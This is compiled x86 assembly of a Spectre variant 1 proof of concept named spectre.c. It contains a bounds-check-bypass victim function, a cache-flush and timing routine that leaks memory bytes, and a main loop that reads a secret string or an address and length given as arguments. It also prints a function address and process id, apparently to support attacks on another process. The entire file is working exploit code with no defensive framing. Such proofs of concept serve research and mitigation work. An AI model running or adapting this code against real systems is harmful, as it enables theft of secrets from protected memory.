	.file	"spectre.c"
	.text
	.globl	last_x
	.bss
	.align 4
	.type	last_x, @object
	.size	last_x, 4
last_x:
	.zero	4
	.globl	unused1
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array2
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused3
	.align 32
	.type	unused3, @object
	.size	unused3, 64
unused3:
	.zero	64
	.globl	unused4
	.align 32
	.type	unused4, @object
	.size	unused4, 64
unused4:
	.zero	64
	.globl	secret
	.section	.rodata
	.align 4
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.text
	.globl	check
	.type	check, @function
check:
.LFB4271:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	array1_size@GOTOFF(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jnb	.L2
	movl	$1, %eax
	jmp	.L3
.L2:
	movl	$0, %eax
.L3:
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4271:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4272:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	last_x@GOTOFF(%eax), %edx
	cmpl	%edx, 8(%ebp)
	jne	.L5
	leal	array1@GOTOFF(%eax), %ecx
	movl	8(%ebp), %edx
	addl	%ecx, %edx
	movzbl	(%edx), %edx
	movzbl	%dl, %edx
	sall	$9, %edx
	movzbl	array2@GOTOFF(%eax,%edx), %ecx
	movzbl	temp@GOTOFF(%eax), %edx
	andl	%ecx, %edx
	movb	%dl, temp@GOTOFF(%eax)
.L5:
	movl	array1_size@GOTOFF(%eax), %edx
	cmpl	%edx, 8(%ebp)
	jnb	.L7
	movl	8(%ebp), %edx
	movl	%edx, last_x@GOTOFF(%eax)
.L7:
	nop
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4272:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4273:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$92, %esp
	.cfi_offset 7, -12
	.cfi_offset 6, -16
	.cfi_offset 3, -20
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	movl	12(%ebp), %eax
	movl	%eax, -92(%ebp)
	movl	16(%ebp), %eax
	movl	%eax, -96(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	xorl	%eax, %eax
	movl	$0, -88(%ebp)
	movl	$0, -76(%ebp)
	jmp	.L9
.L10:
	movl	-76(%ebp), %eax
	movl	$0, results.0@GOTOFF(%ebx,%eax,4)
	addl	$1, -76(%ebp)
.L9:
	cmpl	$255, -76(%ebp)
	jle	.L10
	movl	$999, -80(%ebp)
	jmp	.L11
.L31:
	movl	$3, -64(%ebp)
	movl	$0, -76(%ebp)
	jmp	.L12
.L13:
	movl	-76(%ebp), %eax
	sall	$9, %eax
	movl	%eax, %edx
	leal	array2@GOTOFF(%ebx), %eax
	addl	%edx, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	clflush	(%eax)
	nop
	addl	$1, -76(%ebp)
.L12:
	cmpl	$255, -76(%ebp)
	jle	.L13
	movl	array1_size@GOTOFF(%ebx), %eax
	movl	%eax, %ecx
	movl	-64(%ebp), %eax
	movl	$0, %edx
	divl	%ecx
	movl	%edx, -60(%ebp)
	movl	$29, -72(%ebp)
	jmp	.L14
.L17:
	leal	last_x@GOTOFF(%ebx), %eax
	movl	%eax, -40(%ebp)
	movl	-40(%ebp), %eax
	clflush	(%eax)
	nop
	movl	$0, -84(%ebp)
	jmp	.L15
.L16:
	movl	-84(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -84(%ebp)
.L15:
	movl	-84(%ebp), %eax
	cmpl	$99, %eax
	jle	.L16
	movl	-72(%ebp), %ecx
	movl	$715827883, %edx
	movl	%ecx, %eax
	imull	%edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%edx), %eax
	movw	$0, %ax
	movl	%eax, -48(%ebp)
	movl	-48(%ebp), %eax
	shrl	$16, %eax
	orl	%eax, -48(%ebp)
	movl	8(%ebp), %eax
	xorl	-60(%ebp), %eax
	andl	-48(%ebp), %eax
	xorl	-60(%ebp), %eax
	movl	%eax, -48(%ebp)
	pushl	-48(%ebp)
	call	victim_function
	addl	$4, %esp
	subl	$1, -72(%ebp)
.L14:
	cmpl	$0, -72(%ebp)
	jns	.L17
	movl	$0, -76(%ebp)
	jmp	.L18
.L22:
	movl	-76(%ebp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	sall	$9, %eax
	movl	%eax, %edx
	leal	array2@GOTOFF(%ebx), %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	leal	-88(%ebp), %eax
	movl	%eax, -32(%ebp)
	rdtscp
	movl	%ecx, %esi
	movl	-32(%ebp), %ecx
	movl	%esi, (%ecx)
	movl	%eax, -104(%ebp)
	movl	%edx, -100(%ebp)
	movl	-52(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -88(%ebp)
	leal	-88(%ebp), %eax
	movl	%eax, -36(%ebp)
	rdtscp
	movl	%ecx, %esi
	movl	-36(%ebp), %ecx
	movl	%esi, (%ecx)
	movl	%eax, %esi
	movl	%edx, %edi
	subl	-104(%ebp), %esi
	sbbl	-100(%ebp), %edi
	movl	$100, %edx
	movl	$0, %eax
	cmpl	%esi, %edx
	sbbl	%edi, %eax
	jc	.L21
	movl	array1_size@GOTOFF(%ebx), %ecx
	movl	-80(%ebp), %eax
	cltd
	idivl	%ecx
	movl	%edx, %eax
	movzbl	array1@GOTOFF(%ebx,%eax), %eax
	movzbl	%al, %eax
	cmpl	%eax, -56(%ebp)
	je	.L21
	movl	-56(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	leal	1(%eax), %edx
	movl	-56(%ebp), %eax
	movl	%edx, results.0@GOTOFF(%ebx,%eax,4)
.L21:
	addl	$1, -76(%ebp)
.L18:
	cmpl	$255, -76(%ebp)
	jle	.L22
	movl	$-1, -68(%ebp)
	movl	-68(%ebp), %eax
	movl	%eax, -72(%ebp)
	movl	$0, -76(%ebp)
	jmp	.L23
.L28:
	cmpl	$0, -72(%ebp)
	js	.L24
	movl	-76(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %edx
	movl	-72(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	cmpl	%eax, %edx
	jl	.L25
.L24:
	movl	-72(%ebp), %eax
	movl	%eax, -68(%ebp)
	movl	-76(%ebp), %eax
	movl	%eax, -72(%ebp)
	jmp	.L26
.L25:
	cmpl	$0, -68(%ebp)
	js	.L27
	movl	-76(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %edx
	movl	-68(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	cmpl	%eax, %edx
	jl	.L26
.L27:
	movl	-76(%ebp), %eax
	movl	%eax, -68(%ebp)
.L26:
	addl	$1, -76(%ebp)
.L23:
	cmpl	$255, -76(%ebp)
	jle	.L28
	movl	-68(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	addl	$2, %eax
	leal	(%eax,%eax), %edx
	movl	-72(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	cmpl	%eax, %edx
	jl	.L29
	movl	-72(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	cmpl	$2, %eax
	jne	.L30
	movl	-68(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	testl	%eax, %eax
	je	.L29
.L30:
	subl	$1, -80(%ebp)
.L11:
	cmpl	$0, -80(%ebp)
	jg	.L31
.L29:
	movl	$4, -64(%ebp)
	movl	results.0@GOTOFF(%ebx), %eax
	movl	%eax, %edx
	movl	-88(%ebp), %eax
	xorl	%edx, %eax
	movl	%eax, results.0@GOTOFF(%ebx)
	movl	-72(%ebp), %eax
	movl	%eax, %edx
	movl	-92(%ebp), %eax
	movb	%dl, (%eax)
	movl	-72(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %edx
	movl	-96(%ebp), %eax
	movl	%edx, (%eax)
	movl	-92(%ebp), %eax
	addl	$1, %eax
	movl	-68(%ebp), %edx
	movb	%dl, (%eax)
	movl	-96(%ebp), %eax
	leal	4(%eax), %edx
	movl	-68(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	movl	%eax, (%edx)
	nop
	movl	-28(%ebp), %eax
	subl	%gs:20, %eax
	je	.L32
	call	__stack_chk_fail_local
.L32:
	leal	-12(%ebp), %esp
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%edi
	.cfi_restore 7
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4273:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
	.align 4
.LC1:
	.string	"Putting '%s' in memory, address %p\n"
.LC2:
	.string	"%p"
.LC3:
	.string	"%d"
	.align 4
.LC4:
	.string	"Trying malicious_x = %p, len = %d\n"
.LC5:
	.string	"Reading %d bytes:\n"
	.align 4
.LC6:
	.string	"Reading at malicious_x = %p secc= %c ..."
.LC7:
	.string	"Success"
.LC8:
	.string	"Unclear"
.LC9:
	.string	"%s: "
.LC10:
	.string	"0x%02X='%c' score=%d "
	.align 4
.LC11:
	.string	"(second best: 0x%02X='%c' score=%d)"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4274:
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	movl	%esp, %ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	pushl	%esi
	pushl	%ebx
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x74,0x6
	.cfi_escape 0x10,0x6,0x2,0x75,0x7c
	.cfi_escape 0x10,0x3,0x2,0x75,0x78
	subl	$76, %esp
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	movl	%ecx, %esi
	movl	4(%esi), %eax
	movl	%eax, -76(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	xorl	%eax, %eax
.L51:
	call	getchar@PLT
	movb	%al, -57(%ebp)
	cmpb	$114, -57(%ebp)
	jne	.L34
	movl	secret@GOTOFF(%ebx), %edx
	movl	secret@GOTOFF(%ebx), %eax
	subl	$4, %esp
	pushl	%edx
	pushl	%eax
	leal	.LC1@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	secret@GOTOFF(%ebx), %eax
	leal	array1@GOTOFF(%ebx), %edx
	subl	%edx, %eax
	movl	%eax, -56(%ebp)
	movl	secret@GOTOFF(%ebx), %eax
	subl	$12, %esp
	pushl	%eax
	call	strlen@PLT
	addl	$16, %esp
	movl	%eax, -52(%ebp)
	movl	$0, -48(%ebp)
	jmp	.L35
.L36:
	leal	array2@GOTOFF(%ebx), %edx
	movl	-48(%ebp), %eax
	addl	%edx, %eax
	movb	$1, (%eax)
	addl	$1, -48(%ebp)
.L35:
	cmpl	$131071, -48(%ebp)
	jbe	.L36
	cmpl	$3, (%esi)
	jne	.L37
	movl	-76(%ebp), %eax
	addl	$4, %eax
	movl	(%eax), %eax
	subl	$4, %esp
	leal	-56(%ebp), %edx
	pushl	%edx
	leal	.LC2@GOTOFF(%ebx), %edx
	pushl	%edx
	pushl	%eax
	call	__isoc99_sscanf@PLT
	addl	$16, %esp
	movl	-56(%ebp), %eax
	leal	array1@GOTOFF(%ebx), %edx
	subl	%edx, %eax
	movl	%eax, -56(%ebp)
	movl	-76(%ebp), %eax
	addl	$8, %eax
	movl	(%eax), %eax
	subl	$4, %esp
	leal	-52(%ebp), %edx
	pushl	%edx
	leal	.LC3@GOTOFF(%ebx), %edx
	pushl	%edx
	pushl	%eax
	call	__isoc99_sscanf@PLT
	addl	$16, %esp
	movl	-52(%ebp), %eax
	movl	-56(%ebp), %edx
	subl	$4, %esp
	pushl	%eax
	pushl	%edx
	leal	.LC4@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
.L37:
	movl	-52(%ebp), %eax
	subl	$8, %esp
	pushl	%eax
	leal	.LC5@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	$0, -44(%ebp)
	jmp	.L38
.L46:
	movl	secret@GOTOFF(%ebx), %edx
	movl	-44(%ebp), %eax
	addl	%edx, %eax
	movzbl	(%eax), %eax
	movsbl	%al, %eax
	movl	-56(%ebp), %edx
	subl	$4, %esp
	pushl	%eax
	pushl	%edx
	leal	.LC6@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	addl	$1, -44(%ebp)
	movl	-56(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -56(%ebp)
	subl	$4, %esp
	leal	-40(%ebp), %edx
	pushl	%edx
	leal	-30(%ebp), %edx
	pushl	%edx
	pushl	%eax
	call	readMemoryByte
	addl	$16, %esp
	movl	-40(%ebp), %eax
	movl	-36(%ebp), %edx
	addl	%edx, %edx
	cmpl	%edx, %eax
	jl	.L39
	leal	.LC7@GOTOFF(%ebx), %eax
	jmp	.L40
.L39:
	leal	.LC8@GOTOFF(%ebx), %eax
.L40:
	subl	$8, %esp
	pushl	%eax
	leal	.LC9@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	-40(%ebp), %ecx
	movzbl	-30(%ebp), %eax
	cmpb	$31, %al
	jbe	.L41
	movzbl	-30(%ebp), %eax
	cmpb	$126, %al
	ja	.L41
	movzbl	-30(%ebp), %eax
	movzbl	%al, %eax
	jmp	.L42
.L41:
	movl	$63, %eax
.L42:
	movzbl	-30(%ebp), %edx
	movzbl	%dl, %edx
	pushl	%ecx
	pushl	%eax
	pushl	%edx
	leal	.LC10@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	-36(%ebp), %eax
	testl	%eax, %eax
	jle	.L43
	movl	-36(%ebp), %ecx
	movzbl	-29(%ebp), %eax
	cmpb	$31, %al
	jbe	.L44
	movzbl	-29(%ebp), %eax
	cmpb	$126, %al
	ja	.L44
	movzbl	-29(%ebp), %eax
	movzbl	%al, %eax
	jmp	.L45
.L44:
	movl	$63, %eax
.L45:
	movzbl	-29(%ebp), %edx
	movzbl	%dl, %edx
	pushl	%ecx
	pushl	%eax
	pushl	%edx
	leal	.LC11@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
.L43:
	subl	$12, %esp
	pushl	$10
	call	putchar@PLT
	addl	$16, %esp
.L38:
	movl	-52(%ebp), %eax
	subl	$1, %eax
	movl	%eax, -52(%ebp)
	movl	-52(%ebp), %eax
	testl	%eax, %eax
	jns	.L46
	jmp	.L51
.L34:
	cmpb	$10, -57(%ebp)
	je	.L54
	cmpb	$105, -57(%ebp)
	jne	.L55
	call	getpid@PLT
	movl	%eax, %ecx
	leal	check@GOTOFF(%ebx), %eax
	cltd
	addl	$33, %eax
	adcl	$0, %edx
	pushl	%ecx
	pushl	%edx
	pushl	%eax
	leal	.LC12@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	jmp	.L51
.L54:
	nop
	jmp	.L51
.L55:
	nop
	movl	$0, %eax
	movl	-28(%ebp), %edx
	subl	%gs:20, %edx
	je	.L53
	call	__stack_chk_fail_local
.L53:
	leal	-12(%ebp), %esp
	popl	%ecx
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4274:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB4275:
	.cfi_startproc
	movl	(%esp), %eax
	ret
	.cfi_endproc
.LFE4275:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB4276:
	.cfi_startproc
	movl	(%esp), %ebx
	ret
	.cfi_endproc
.LFE4276:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
